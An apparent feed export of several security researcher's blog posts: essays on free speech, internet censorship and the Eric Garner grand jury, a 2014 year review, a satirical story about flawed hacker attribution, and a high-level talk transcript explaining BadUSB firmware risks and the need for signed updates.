<p>The point here is clear — irrational extremists are acting in unimaginable violence against those that they disagree with, and in doing so, branding the religion as one of violence and hate. This is a fact that everyone needs to understand.</p>

<h2>Religious Violence</h2>

<p>Violence and religion have went hand in hand throughout recorded history. Christianity has <em>mostly</em> moved away from violence and many of its ancient prejudices (though certainly not all) — something Islam is still struggling with, based on the extreme views and actions of not only terrorist organizations, but governments.</p>

<div class='embed tweet'><blockquote class="twitter-tweet" align="center" width="350"><p>Crowd shouted “Allahu akhbar” as Raif Badawi received 50 lashes for the crime of writing words. 950 more to come&#10;<a href="http://t.co/RRh97uaucT">http://t.co/RRh97uaucT</a></p>&mdash; Richard Dawkins (@RichardDawkins) <a href="https://twitter.com/RichardDawkins/status/553816128758501376">January 10, 2015</a></blockquote>
<script async src="https://adamcaudill.com///platform.twitter.com/widgets.js" charset="utf-8"></script></div>


<p>While extremists have done much to harm Islam, there seems to be a pervasive penchant for violence among the more ‘conservative’ Islamic countries — this acceptance of violence and frequent <a href="http://www.nytimes.com/2007/11/16/world/middleeast/16saudi.html?_r=0">perversions of justice</a> have also done much to make the world question the Islamic commitment to peace.</p>

<p>For me, as an atheist, knowing that there are thirteen Islamic countries where I could be <a href="http://www.reuters.com/article/2013/12/10/us-religion-atheists-idUSBRE9B900G20131210">put to death</a> for my lack of faith certainly makes me question just how much peace factors into Islamic views.</p>

<p>While most Muslims are peaceful, the large numbers that espouse peace through forced conformity and violence taint the view of the entire religion.</p>

<h2>Freedom from Offense</h2>

<p>One of the most bizarre and damaging perversions on the innate right to free speech, is that there is an implied inverse right to <em>not</em> be exposed to anything offensive. Yet this fictitious right to not be offended is antithetical to freedom of speech - you can have only one of the two.</p>

<p>A right to not be offended is a personal right that would trump the rights of all others — freedom of speech does not imply that anyone must listen, only that you have the right to speak. A right to not be offended would require others to not speak if you didn’t like what they had to say. Such a right is a logical impossibility — if we accept that there is truly an innate right to free speech, then there is no overriding inverse.</p>

<p>So the reality is simple — there are times to preserve the critical and innate right to free speech, that some will be offended.</p>

<p>One challenge for a journalist is to effectivly get a message across that challenges without offending more than absolutely necessary. I can’t say if Charlie Hebdo crossed that line, but even if they did, they were within their rights.</p>

<h2>All Speech Has Value</h2>

<div class='embed tweet'><blockquote class="twitter-tweet" align="center" width="350"><p>All speech, even the extremely stupid stuff, is valuable. I probably wouldn&#39;t understand evolution were it not for the insane creationists.</p>&mdash; Taylor Hornby (@DefuseSec) <a href="https://twitter.com/DefuseSec/status/554541092264108034">January 12, 2015</a></blockquote>
<script async src="https://adamcaudill.com///platform.twitter.com/widgets.js" charset="utf-8"></script></div>


<p>One final note, inspired by a friend, is that all speech — from the inane and ignorant to true hate speech can have some value. It provides insight, understanding, and perspective that would be missed otherwise.</p>

<p>For those that don’t share perspective with the speaker, such speech that many consider worthless can be a learning experience. You may never agree with them, but at least you can better understand them, and that may lead to clarity.</p>

<p>Embrace the speech that you disagree with and better understand the people behind a perspective that is new to you — it’s a chance to expand you mind, and maybe even bridge a gap and create new understanding.</p>

      <title>Utopia Found; Utopia Lost</title>
      <description><p>Sometime in the 1990’s I used a 2400-baud modem and connected to the internet for the first time; I found a new world, a better world. A world where ideas and intellect set people apart, not skin color, or political affiliation, of even the pseudo-scandal of the day (which is probably just a disguise for ignorance and intolerance).</p>

<p>It was a time of invention, in a world where everything was new and the potential was unlimited. It was magic - not the fake Hollywood magic, but real, life changing, nothing can hold you back magic. The only real restriction was your own mind (and maybe your long-distance bill).</p>

<p>Before too long I ran across a short essay that reinforced my view of the internet, and my philosophy towards people in general - <a href="http://phrack.org/issues/7/3.html">The Conscience of a Hacker</a>. While it resonated with me at the time, as it reflected my life so well, it was one small passage that really mattered to me:</p>

<blockquote><p>We exist without skin color, without nationality, without religious bias&#8230; and you call us criminals.</p><footer><strong>Loyd Blankenship</strong> <cite>The Conscience of a Hacker</cite></footer></blockquote>


<p>One simple line, yet such a profound statement. The internet I grew to love was a different world — national borders meant nothing, the freedom to speak your mind was simply assumed for all without question. Governments didn’t understand it well enough to care, and so it was ignored. A different kind of society was allowed to evolve — a society that valued people and intelligence greater than political or religious affiliation. A society where anyone, even a poor kid from the middle of nowhere could have a real impact on the world.</p>

<p>There was of course conflict, and egos, and the ever increasing encroachment of money that would change everything; but in general, it was good — better than any nation I was aware of.</p>

<h2>Utopia Lost</h2>

<p>Today, Solar Designer was commenting on Intel <a href="https://twitter.com/solardiz/status/551496338995937280">shutting down</a> certain Russian-language content due to a rather <a href="http://www.washingtonpost.com/world/russian-blogger-law-puts-new-restrictions-on-internet-freedoms/2014/07/31/42a05924-a931-459f-acd2-6d08598c375b_story.html">horrible Russian law</a>:</p>

<blockquote><p>Most people and most countries are their own worst enemies…</p><footer><strong>Solar Designer</strong> <cite><a href='https://twitter.com/solardiz/status/551498166366142465'>twitter.com/solardiz/status/&hellip;</a></cite></footer></blockquote>


<p>From the early, government ignored days of the internet, certain rights were assumed for all users — it was never written, but at the time it seemed that the internet was beyond any one government. It belonged to humanity, it was for the people. Of course, looking at the history of the internet, this is somewhat amusing, but it’s the way many felt, and it seems many still do.</p>

<p>Freedom of speech, freedom to speak anonymously, and so many others were granted by the internet to people that in the past had never had them. This great invention, this great network of people, had become the greatest tool of equality ever. Such things seem doomed.</p>

<p>As Solar pointed out - countries are their own worst enemies - in this case a horrible law is not only impacting the freedom of speech, but also to avoid the complications it introduces (and other similar laws recently enacted), companies are <a href="http://www.businessinsider.com/google-pulls-out-of-russia-2014-12">pulling out of Russia</a> or disabling functionality for Russian users. So the Russian people lose, the economy is impacted, everybody loses something when such mistakes are made.</p>

<p>Of course, this is far from a unique case — the old internet, the free, open, good for humanity internet is all but dead. It’s been a long time since governments discovered what they had ignored for so long, and that an international bastion of freedom had formed under their noses.</p>

<p>Censorship becomes more pervasive every day, the monitoring by the FIVE EYES countries - and who knows who else - is so pervasive that one has to now assume that anything not (securely) encrypted is being seen and analyzed by many. Malware vendors grow rich, by leveraging the greatest invention in human history as a tool for repression and even death. In Russia, exercising an innate human right can <a href="http://www.bbc.com/news/world-europe-16057045">send you to prison</a>, in Syria, <a href="http://thelede.blogs.nytimes.com/2012/02/21/syrian-video-blogger-reportedly-killed-in-homs-as-shelling-continues/?_r=0">it can get you killed</a>.</p>

<p>Complacency, subterfuge, infighting, and carelessness have allowed those with power and money to take more more control than they ever should have. Groups like the MPAA are still busy pushing bad laws, trade treaty negotiations continue to risk further censorship, and anti-terror laws are increasingly being aimed at online speech instead of legitimate threats.</p>

<p>The internet I fell in love with was a bastion of freedom. May it long be defended, even if all that’s left is the memory, and the idea of what it could again become.</p>

      <title>2014: Year In Review</title>
      <description><p>Inspired by a post from <a href="https://scott.arciszewski.me/blog/2014/12/year-2014-reflection">Scott Arciszewski</a>, I&#8217;ve decided to go ahead and publish a year in review post. This is something that I&#8217;ve generally avoided in the past, as the tone of these posts is more often than not, just cynicism and negativity. After seeing Scott’s post, it made me think about how such a review can be used to send a positive message — something desperately needed.</p>

<p>Year after year, we see predictions, projections, and sales pitches — and the cynical responses that they always generate. It&#8217;s so easy to spend time rolling our eyes at vendors and media, instead of looking forward to ways to improve the situation and make the world a better place — even if only in a tiny way. We may not be able to fix the stupid, but we can at least reduce the damage that it does.</p>

<h2>2014 In Review</h2>

<p>So, without further ado, a personal look back at 2014.</p>

<h3>Security Research &amp; Related</h3>

<p>Overall this has been a very busy year, and I’ve not been able to publish as much as I’d like. In total, I requested only a single CVE for the entire year - <a href="https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2014-2890">CVE-2014-2890</a> (I don’t keep a count of how many security related tickets I open, so no idea how many issues I actually reported).</p>

<p>Most of my time was instead spent on a couple projects - <a href="https://github.com/smimp/smimp_spec">SMIMP</a> and <a href="https://github.com/adamcaudill/Psychson">Psychson</a> (BadUSB firmware). I’ll talk more about these later.</p>

<p>I wasn’t able to spend as much time on public application security work as I had intended, but I did get some reports in, some advice given, some progress made.</p>

<h3>Speaking</h3>

<p>In 2014 I was fortunate to be asked to speak on a few occasions. When preparing for a talk, I always have mixed emotions — on one hand, it&#8217;s always been a great experience, a chance to meet new people, share knowledge, and hopefully contribute to the community. On the other hand, it&#8217;s a significant amount of time that is lost — and time is without a doubt my most limited resource.</p>

<p>Whether it makes sense or not, I generally don&#8217;t give he same talk twice — especially if the event is recorded. So for each talk, it&#8217;s a real time &amp; energy commitment. I very much hope that those that have seen my talks appreciated them, and got something out of them.</p>

<p>Here is some information from selected talks:</p>

<ul>
<li><a href="https://adamcaudill.com/2014/08/16/smimp-at-the-defcon-cryptovillage/">SMIMP at the DEFCON Crypto Village</a></li>
<li><a href="https://adamcaudill.com/2014/10/02/making-badusb-work-for-you-derbycon/">Making BadUSB Work For You - DerbyCon</a> (YouTube video now over 100,000 views!)</li>
<li><a href="https://adamcaudill.com/2014/11/23/speaking-at-sc-magazine-congress/">Speaking at SC Magazine Congress</a></li>
</ul>


<h3>Personal</h3>

<p>Personally, this has been a particularly trying year for me, for various reasons. I have, as I always do, made a real effort to not show what&#8217;s going on when things go wrong. So, for all my friends, and everyone else for that matter — if there were times I was distant or difficult, or evasive — I am truly sorry.</p>

<p>With that said, the year could have been far worse, and I&#8217;m incredibly grateful for all the friends I have — old and new. It was a busy year, with much going on and never enough time to make everything that needed to happen, actually happen.</p>

<h3>Projects</h3>

<p>During the year, much of my time was taken up by a couple projects — here is where they stand today:</p>

<p><strong><a href="https://github.com/smimp/smimp_spec">SMIMP</a></strong> - Without a doubt the most ambitious project I&#8217;ve worked on, with a goal no less than replacing email itself. The first public draft was released in late July — and unfortunately remains basically untouched since then.</p>

<p>Shortly before I released the first public draft, a start-up tried to acquire the rights, so they could develop it, and build there own applications around it. By the time that I told them that I was more interested in making the specification public, they had offered me a position as co-founder in exchange for it.</p>

<p>This project took a substantial amount of time to get to a first draft — and really, it isn&#8217;t complete yet. Given the original goal of the project, leaving it with open issues really doesn’t bother me — that many more points to talk about.</p>

<p>The original plan for the effort was to spur discussion, to get people talking about how email could be replaced. To be secure, a system must be designed with certain goals and threats in mind - something that didn&#8217;t happen with email as we know it today. So to fix email, we need to replace it. SMIMP may not be the answer, but we need to do something.</p>

<p>Overall, though there was some positive feedback, I consider the project to be a failure. I&#8217;m proud of the work I did on it, but it didn&#8217;t have the desired effect.</p>

<p><strong><a href="https://github.com/adamcaudill/Psychson">Psychson (BadUSB Firmware)</a></strong> - Without a doubt the work that had the most people talking. It was a fun project, we managed to get some code in the hands of those that wanted to extend it.</p>

<p>It’s over, and I’m glad it’s over.</p>

<p><strong>Blog</strong> - This blog has also been a bit less active than I hoped — 16 posts with a total of 18,040 words. I’m pretty sure last year I said I’d blog more. Oops.</p>

<p><strong>My First Novel</strong> - A couple years ago I started occasionally working on an idea for a novel, this year, I set aside what I had been doing, and started fresh (but still based on the same material). My goal was to finish it this year, by there simply wasn&#8217;t enough time.</p>

<p>Writing is something that I have yet to determine if I&#8217;m actually good at - or if I just limp along enough for others to tolerate. While I could write a technical book with confidence, writing fiction is something that, quite intentionally, pushes what I&#8217;m comfortable with.</p>

<p>Making the time and finding the focus for something like this is certainly more difficult than I had imagined. I&#8217;ve come to understand why so many writers drink.</p>

<h3>Overall</h3>

<p>I have to say, I love the communities that I work with. I love that I get to deal with challenging problems. I love that I get to find solutions and make them work. But most of all, I’m thankfully for so many friends and great people that make this work truly enjoyable.</p>

<h2>Looking forward to 2015</h2>

<p>I have a number of goals for 2015, a number of projects that need my attention, and ideas to make the world just a little bit better.</p>

<ul>
<li>SMIMP - While I feel that the project generally failed, there doesn’t seem to be much movement in the let’s-kill-email space, so I don’t think it’s dead quite yet. There just might be another chance to get people talking about a real solution.</li>
<li><a href="https://github.com/adamcaudill/CurveLock">CurveLock</a> - An open source, secure, modern encryption application. This is mainly an experiment - but the goal is to provide high security, in a simple, easy to use application. Hopefully will get a beta out before too long.</li>
<li><a href="https://github.com/EncryptingCamera/encryptingcamera-spec">EncryptingCamera</a> - Prompted by a conversation on Twitter, a few people got together to make a new application that will hopefully protect a few reporters — and others that need to take photos, and secure them from inspection.</li>
<li>Blog - Last time that I promised to blog more often, I didn’t post again for months, so I’m hoping that I don’t repeat that this time. But I promise to write more, and do my best to keep the content interesting.</li>
<li>Personal Transparency - I’ve always been very concerned with my professional image, and as such tend to keep many details of my life to myself. One personal goal for this year is to be <em>just a bit</em> more open and transparent.</li>
<li>Novel - I intend to have either a deal signed with a publisher, or to publish as an ebook on Amazon before the end of 2015. One way or the other, I’ll be done with it by the end of the year.</li>
<li>Research - I plan on spending more time evaluation open source applications for security issues. In just a few hours a week, can have a real impact on making applications and users more secure.</li>
<li>Open Source Security Tools - I hope to dedicate a reasonable amount of time on new and existing tools to make users more secure, especially when it comes to secure communication. PGP/GPG hasn’t aged well - tools like <a href="https://github.com/tedu/reop">reop</a> have a lot of technical potential, but usability still needs to be improved.</li>
<li>More time outside of the echo chamber - It’s easy to stay inside of the echo chamber, agreeing with ourselves (or disagreeing), but what good does it really do? To have a real impact, we need to spend more time influencing the people that need our help the most.</li>
<li>Consume less, create more - In general, consume less and create more — time is a precious and limited resource, should be used to do as much good as possible.</li>
</ul>


<p>Oh, and one final note for next year - my wife and I are expecting again. Should be an exciting year.</p>

      <title>Irrational Attribution: APT3.14159</title>
      <description><p><em>[Note: This is satire / fiction; well, more or less - probably more more than less. Any resemblance to real companies, living or dead, is purely coincidental.]</em></p>

<p>WASHINGTON, D.C — Unnamed White House officials that spoke on the condition of anonymity, have stated that a major American company has been hacked, and the attackers are threatening to release terabytes of proprietary information. The name of the company has not been released at this time.</p>

<p>The officials say that the attack came from a state-sponsored attacker — the speed at which the attackers gained control of the company’s network, the focus on administrative credentials, and the sophistication of the previously unseen malware used in the attack. Based on IP addresses used, the attack has been tied to Belize.</p>

<p>Security researchers from Mendyant Security are working a new report, to be released next week. They have dubbed this new group APT3.14159 - and have identified prior attacks that share similarities with the new attack revealed today. They have identified the attackers as Unit 26478 of the Belize Defense Force.</p>

<p>Officials from the Belize Defense Force refused to comment on this story.</p>

<hr />

<p>“I just talked to the CEO, he wants hourly updates on our findings. Now that the FBI, and Mendyant Security is involved, he wants to know, real time, what’s going on and what we’ve found” said Bob, the middle-age middle-manager that had no experience with security, but accepted the position because it paid more.</p>

<p>“Bob, there are three of us, you have three analysts on the team - we are the entire security team, and we’ve been working for two days straight so far. We’ve had to shut down the entire network - even the core switches are down. We can’t access anything, the US data center is in New York, and the secondary in in Japan. We’ve spent the last two days just collecting notes and making sure that everything was shut down. Here’s your update: we know nothing besides that we were hacked.”</p>

<p>Jerry, a tall, slender, over-worked security analyst had spent the last two days trying to contain a massive hack that liked impacted everything inside the company. Having only three analysts that could do anything useful - and multiple managers that wanted constant updates so they would appear useful - the team was exhausted, confused, and unable to do anything at this point.</p>

<p>The attackers had sent company executives screenshots and file listings from the data they had collected, and demanded a ransom or they would release the data and destroy their systems - the executives couldn’t make anything of it, so assumed it wasn’t important. The security team wasn’t made aware of the emails until workstations started dying.</p>

<p>Two hours after the deadline passed, workstations throughout the multinational company started to fail. At first, the local technicians assumed it was just an unusual rash of hardware failures. By 9AM Eastern the next day, over 3,000 machines had been reported offline, with the number impacted climbing rapidly.</p>

<p>Then, finally, someone called the Director of Information Security - but by unfortunate coincidence he was in a meeting until 10AM. When he finally talked to the technicians, the number reported had grown to 5,500 - he immediately called the Senior Manager of Security Assurance. Unfortunately though, she worked in the west coast, and didn’t start her day until noon eastern time. She immediately realized that something very bad was going on, and asked the Manager of Systems Security (Bob), to have his team of analysts look into it. Bob though, though it was an Information Services issue, and directed the issue to the Senior Manager for Systems &amp; Infrastructure. Two hours later, after traversing his chain of command, he determined it was a security issue, and sent it back to the Senior Manager of Security Assurance. By the time it landed back on her desk, at 2PM Eastern, the number on downed workstations was now over 10,000 and 500 servers. She again passed the issue to Bob, and at 3PM the analysts were finally aware that something had happened.</p>

<p>Once the small team of security analysts were finally made aware, they quickly started to do damage control - disabling all connections to the internet, disconnecting the separate physical sites, anything they could think of to limit the spread of whatever this malware is.</p>

<p>One of the analysts quickly pulled an image of one of the local manager’s laptop, and began to analyze it on her personal machine - all the security analysts assumed that their machines would be wiped too, so any serious work was done on their personal laptops. Within an hour she identified an unusual file, that was named similar to a critical Windows file, but wasn’t signed by Microsoft. She uploaded the file to VirusTotal - none of the engines detected it as malicious, nor did their antivirus software of choice. She noticed that it referenced a well known driver used in commercial software to wipe drives before disposing of them - this looked like the smoking gun.</p>

<p>Thanks to her quick work, they were able to get technicians at local sites to begin cleaning up - by then end of the day, only half of their machines had been wiped. Had it not been for her identifying it, all of their Windows workstations and servers would have been wiped.</p>

<p>“Well, what do I tell the CEO Jerry?”</p>

<p>“Tell him there’s nothing more we can do, so we went to bed. We’ll be back tomorrow-ish” - and with that, the entire team (all three of them) walked out the door.</p>

<hr />

<p>Inside a five story brick office building, on the outskirts of San Francisco a team of analysts for Mendyant Security study the limited logs available and the sample of the malware the Sone Corp analyst found.</p>

<p>From looking at the debug information and embedded strings, there were clear signs of Spanish and Kriol - a dialect of Creole that is common in Belize. The mix of languages in the strings and in the file paths led the analysts to conclude that it wasn’t the work of a single person, but a multilingual team.</p>

<p>The logs indicated that the malware was connecting to China, India, Spain, and Russia. After some initial analysis, all of the Command &amp; Control servers used a particularly old version of a content management system, and were easily hacked. The analysts decided that seeing as these servers were likely hacked, and that the easiest way to gather information from them was to go ahead and hack them and collect whatever information they could.</p>

<p>Within a couple hours, they were downloading full copies of all the data on each of the servers. Once downloaded, they would study the C&amp;C software to see if anything interesting is going on.</p>

<p>The C&amp;C software was written in PHP, and did fairly little on its own - most of the commands were relayed back to a hard-coded  IP on port 31337. The server at that IP was no longer online, so  one of the analysts contacted a security researcher that had been performing internet wide scans, asking if he had any information for that IP. They were lucky, his logs showed that an HTTP server came online on that server a little over six months ago, and disappeared on his last scan, just two days ago.</p>

<p>Looking up the owner of the IP, it was register to the Belize Defense Force. APT3.14159 was born.</p>

<p>The story is clear, hackers for the BDF hacked the C&amp;C servers, having them relay to their own server; once detected, the main server was taken off line.</p>

<hr />

<p>NEW YORK, N.Y. — Today, the FBI revealed that the major corporation attacked by hackers working for Belize, is Sone Corp., a entertainment powerhouse. The stock briefly dropped 5%, but closed the day with a minor increase.</p>

<p>Anonymous source within the government have revealed that they are completely confident that Belize is completely behind this, and other recent attacks. “There will be a price to pay for attacking American businesses - the administration is reviewing the options in response to this clear act of cyber-terrorism” - the source refused to be identified as they weren’t authorized to speak on the subject.</p>

<hr />

<p>With the media in a frenzy, the President was forced to make a statement, formally accusing Belize of attacking not only Sone Corp, but several smaller attacks over the last six months. The tone was harsh, there were promises of severe economic penalties. The United States would not tolerate such attacks.</p>

<hr />

<p><em>Six months earlier…</em></p>

<p>In a small bar off of the Las Vegas strip, a small group of pentesters seek refuge from the chaos that is DEF CON. After a few rounds of top-self whiskey, one has a bright idea…</p>

<p>“I’d bet if we spent a few dollars to get a VPS in China, hacked the first military server we can - pull off a few attacks, within a few months we could get the U.S. Government &amp; some of these big security contractors to label us as a nation-state actor.”</p>

<p>“Nah, I’m sure they get the NSA TAO involved to verify before pointing fingers.”</p>

<p>“$1,000 says it’ll work.”</p>

<p>“You’re on.”</p>

      <title>Orwellian Justice</title>
      <description><p>A few hours ago, a Grand Jury in New York decided that the video-taped murder of an unarmed man didn’t justify a trial to determine if those, clearly seen and identified, who killed him had broken any laws. The man I speak of is <a href="https://en.wikipedia.org/wiki/Death_of_Eric_Garner">Eric Garner</a>. What struck me immediately, was the Orwellian undertones that this event has.</p>

<h3>Grand Juries &amp; Time Control</h3>

<blockquote><p>He who controls the past controls the future. He who controls the present controls the past.</p><footer><strong>George Orwell</strong> <cite>1984</cite></footer></blockquote>


<p>In criminal cases brought before a Grand Jury to determine if there’s enough evidence that a person is guilty of a crime to justify being charged, the person that controls the past, is the prosecutor. Their responsibility is to present the evidence to the jury - documentation, photos, videos, testimony, etc. - to get them to bring charges, if there is enough to show guilt.</p>

<p>The show isn’t ran by the courts, as is the case with other parts of the justice system, but instead by the prosecutor, who has control over what the jury sees and hears. It is this power, this control over evidence, this control over the past, that allows them to, when they so choose, to take on an alternate role - defender.</p>

<p>In 1985, <a href="https://en.wikipedia.org/wiki/Sol_Wachtler">Sol Wachtler</a>, the Chief Judge of the New York Court of Appeals rather famously mused that a prosecutor could indict a ham sandwich if they wanted to - and based on numbers from the federal grand jury system, that seems very accurate. In 2010, federal grand juries returned indictments in 162,000 cases - and declined to do so in only 11.</p>

<p>For those that are outside of the law enforcement community, it’s clear that the grand jury is just a rubber stamp process. Yet, for those inside the system, its use is more delicate, more finessed - more directed. It’s easy for a prosecutor to get a jury to indict someone - but as recent events have shown, with enough time, they can take undeniable evidence and through careful tactics, sabotage their own case. Preventing the accused from being charged at all.</p>

<p>Suppress useful evidence, call questionable witnesses, present confusing and unclear information, question the integrity of everything presented - there are so many options available to ensure that the jury won’t see clear guilt. With some time, the prosecutor becomes the master of the past, painting the picture that he wants the jury to see - free from disagreement or dissenting views.</p>

All evidence seen via prosecutor&#39;s lens.</p>&mdash; matt blaze (@mattblaze) <a href="https://twitter.com/mattblaze/status/540238535274418176">December 3, 2014</a></blockquote>

<h3>Just a little doublethink…</h3>

<p>How much time, how many confusing statements, how many character assassinations does it take before a jury can see, with their own eyes, a murder - and by the skill of a great <del>defense attorney</del> prosecutor, accept that while they saw a murder, a murder didn’t occur?</p>

<p>Or, in this case, not only didn’t a murder occur - no crime at all occurred. He was murdered, and he wasn’t.</p>

<p>It’s important to remember, this wasn’t a open trial - this was simply to determine if charges should be brought at all. In this case, the decision was that there will be no charges, no trial to determine if the killing was justified, no attempt at justice for the dead. Never will a real jury, in a court of law, hear the case and be able to make a determination based on the evidence - that determination was already made by the prosecutor.</p>

<p>A process that is a rubber stamp to those on the outside, becomes a free-pass for those on the inside of the system.</p>

<h3>…and justice for all.</h3>

<p>There is no justice in this case, nor illusion of justice. No thinly veiled farce of a trial to appease the masses. Nothing.</p>

<p>I must wonder, how much longer before such cases won’t even see the “light” of a secret grand jury, and just die on a prosecutors desk. When the prosecutor works to defend the accused - only when the accused is part of their system of course - why bother with the show, why even pretend to try. Justice isn’t their goal, protecting those on the inside, those that enforce is the goal.</p>

<p>Control, intimidation, and fierce reprisal to any that dare resist is the hallmark of enforcement today - “justice” is granted to the favored, retribution to the rest. Enforce and control has become the unspoken replacement to “protect and serve” - a statement that meant little, and now serves as an insult to those, that for one reason or another, find themselves outside of the “favored” group.</p>

<div class='embed tweet'><blockquote class="twitter-tweet" align="center" width="350"><p>Crimes committed by LEOs should be prosecuted by a special prosecutor; the risk &amp; impact of them acting as a defense attorney is too great.</p>&mdash; Adam Caudill (@adamcaudill) <a href="https://twitter.com/adamcaudill/status/540249660947181568">December 3, 2014</a></blockquote>
<script async src="https://adamcaudill.com///platform.twitter.com/widgets.js" charset="utf-8"></script></div>


<p>Who enforces against the enforcers? Who can be objective when dealing with a person inside the system that supports them? For any chance at justice, when a member of law enforcement is accused of a crime, it should be an outside prosecutor that brings the case to the grand jury. While there’s still risk of the prosecutor acting more as a defender, by appointing a special prosector from outside the normal system, there’s at least some chance that the grand jury will see the unaltered truth. Then, maybe, there will be a chance for real justice.</p>

<p>Change to the justice system in the United States is needed on many fronts, racism is rampant, intimidation and coercion have become normal, police are more militarized than the military, and the use of excess force is justified by any excuse. Killing a person should be the last, most desperate line of defense - not something excused by the slightest feeling of discomfort. Though as long as the grand jury can so easily act as a free pass, this change will never be achieved.</p>

<p>Things like body cameras, which the federal government is now supporting, are a step in the right direction. They eliminate questions, and allow the public to see, with their own eyes, what happens. But, no matter how many cameras are deployed to monitor law enforcement activity, if grand juries ignore evidence that’s inconvenient to a prosecutor’s goal, no crimes will be averted, no pointless deaths prevented.</p>

<p>The system is broken. Only by a feat of doublethink can anyone see anything else.</p>

<p><em>To my friends in law enforcement:</em> Please don’t take this as an attack against you. You have a hard job, and at times it’s certainly dangerous. But the system is broken, you may think my view is wrong - but your perspective is likely just as tainted. To those on the outside, to those that don’t have the benefit of being protected by the system - too often feel oppressed by the system, punished unfairly and in excess of reason. Please understand that there is a perspective that you, likely, can’t see.</p>

      <title>Speaking at SC Magazine Congress</title>
      <description><p>Last week <a href="http://brandonw.net/">Brandon Wilson</a> and I gave the lunch keynote at the <a href="http://congress.scmagazine.com/page.cfm/link=16">SC Magazine Congress</a> event in Chicago. It was a fun, more executive level event - a big thanks to Eric Green and team. The talk was mostly an executive overview of what was discussed at <a href="https://adamcaudill.com/2014/10/02/making-badusb-work-for-you-derbycon/">our DerbyCon talk</a>, with some updates, and some insights.</p>

<p>Here are the slides, and a rough transcript from the event:</p>

<iframe src="https://adamcaudill.com///www.slideshare.net/slideshow/embed_code/41900274" width="425" height="355" frameborder="0" marginwidth="0" marginheight="0" scrolling="no" style="border:1px solid #CCC; border-width:1px; margin-bottom:5px; max-width: 100%;" allowfullscreen> </iframe>


<p><em>(This is based on the speaker notes - so it doesn’t include the discussion and other bits that were said)</em></p>

<p><strong>Slide 2:</strong> (Adam) Hi, I&#8217;m Adam Caudill, I&#8217;m here today with Brandon Wilson, and we are here to talk about some research that we&#8217;ve been working on. We will be giving you some background information on BadUSB, showing it to you in action, and talking through the real risks.</p>

<p><strong>Slide 3:</strong> (Adam) USB devices are truly ubiquitous - they are all around us. We all use them on a daily basis, but as is true for most technologies, the things that make our lives easier can be turned to attack us. This is a clear case of a technology that was designed to make life easier, but thanks to designers and implementers not fully understanding the potential for abuse, they have opened a door to attack vectors that most people don’t realize exists.</p>

<p>That USB is so common is both a blessing and a curse – from a convenience perspective, it’s great that USB devices and things that support USB are everywhere, but from a security perspective, there are costs, there are risks. Risks that few people realize that they need to be worried about.</p>

<p><strong>Slide 4:</strong> (Adam) BadUSB - the ability to take a seemingly harmless device and turn it into something evil, has been getting a lot of attention lately. We are here to talk about our findings, other research that&#8217;s going on, how this research can be extended, and what it means for those trying to defend against attacks.</p>

<p><strong>Slide 5:</strong> (Adam) First, lets talk about what BadUSB isn&#8217;t - it&#8217;s not an exploit, it&#8217;s arguably not even a vulnerability. It&#8217;s not a flaw in a device, or an oversight in a protocol. BadUSB, really, part behavior by design, and part carelessness on the part of device manufacturers.</p>

<p>BadUSB was first publicized by the Security Research Labs team from Germany, their work started with looking into a way to reprogram thumb drives to perform data processing - this led them to realize that the technique they intended to use to add features, could also be used by attackers.</p>

<p>Their talk at Black Hat USA was the first time many people heard about the possibility for such issues. It&#8217;s their talk, and their decision to limit the details they released, that led us to change directions in some research we were doing, and get more details and code out to defenders.</p>

<p>Before we go too much further, lets talk just a little about USB, things most people don’t know about it.</p>

<p><strong>Slide 6:</strong> (Brandon) When BadUSB was first introduced, the focus was on a design aspect of USB - something that has been used by legitimate designs for years, composite devices. In short, a composite device is a USB device that has multiple interfaces, or profiles, each exposing a different type of device. The classic case for BadUSB is a thumbdrive that is also a keyboard.</p>

<p>This isn&#8217;t a vulnerability though - this is perfectly compliant with the USB specification. Devices are allowed to do this, it&#8217;s intended behavior and by itself is not a bad thing. Of course, this doesn&#8217;t just apply to being a mass storage device and a keyboard - NICs, printers, USB display adapters, webcams, and so on - any combination is possible.</p>

<p>So, for this part at least - it&#8217;s a feature, a feature that can be abused.</p>

<p><strong>Slide 7:</strong> (Brandon) To turn a thumbdrive into something more, it requires updating the device’s firmware - the code that resides on the device and makes it function. Many people see thumbdrives as just a data storage device, without realizing that there&#8217;s a programmable controller inside.</p>

<p>These controllers are often user updatable, meaning that with only some software, anyone can perform the update. Why would the manufacturer want to let people update the firmware on a flash drive, you might ask? Well, there can be bug fixes, improvements to how it communicates with the NAND memory inside, better bad block management, etc. Where this becomes a problem though, is that some of the largest controller vendors don&#8217;t enforce signed updates. So not only can any user update them, they can update them with any code they choose.</p>

<p>So this, the fact that they are selling chips that don&#8217;t have any security considerations at all, is what turns USB&#8217;s feature of allowing composite devices into a real attack vector.</p>

<p><strong>Slide 8:</strong> (Brandon) Using firmware as an attack vector is far from new though, it&#8217;s been done for years - though I don&#8217;t believe that most people realize that so much research has been done that shows how weak many devices are.</p>

<p>We’ll get into some examples a little bit later, but people were reprogramming Apple keyboards to appear as other devices years ago, and a decade ago I was making graphing calculators show up as flash drives, so this is by no means new.</p>

<p><strong>Slide 9:</strong> Here is a picture of a typical thumb drive &#8211; there is the USB port of course, then that square controller chip which is the “brain” of the device (and what runs the firmware that makes the drive work), and then the NAND flash memory on the far left.</p>

<p>There are different vendors involved here &#8211; NAND comes from one company, controller from another, sold under another name, etc. They’re essentially just putting the parts together, so there are a lot of different combinations out there.</p>

<p><strong>Slide 10:</strong> (Brandon) Let&#8217;s take a few minutes to talk about firmware&#8230;</p>

<p>For this talk, so we can have specific examples, we are going to talk about the Phison family of controllers - Phison is the largest maker of controllers used in thumbdrives, so that&#8217;s why we are picking on them.</p>

<p>In this case, the device has a small boot image built into the controller itself, which is responsible for loading the firmware from the NAND chip and executing it - through the use of special applications on a PC, users can update the firmware with different, or modified versions. This is something most users know nothing about - but it&#8217;s there.</p>

<p><strong>Slide 11:</strong> (Brandon) Devices with updateable firmware aren&#8217;t inherently evil of course, but the question is, does it use signed updates. Which is to say, do the updates include a cryptographic signature, based on a protected private key that only the device manufacturer has access to. If the answer to that is no - the devices doesn&#8217;t validate the origin of updates, and it could be a target for a BadUSB style attack.</p>

<p>To be secure, devices need to validate all updates, using a non-updatable public key. This is the only way to ensure that the firmware is from a legitimate source, and not from some attacker. If the public key were updateable, then there&#8217;s the risk that with physical access, or by taking advantage of a flaw, the key could be changed to an attacker-controlled public key - making it impossible to restore the device to stock firmware.</p>

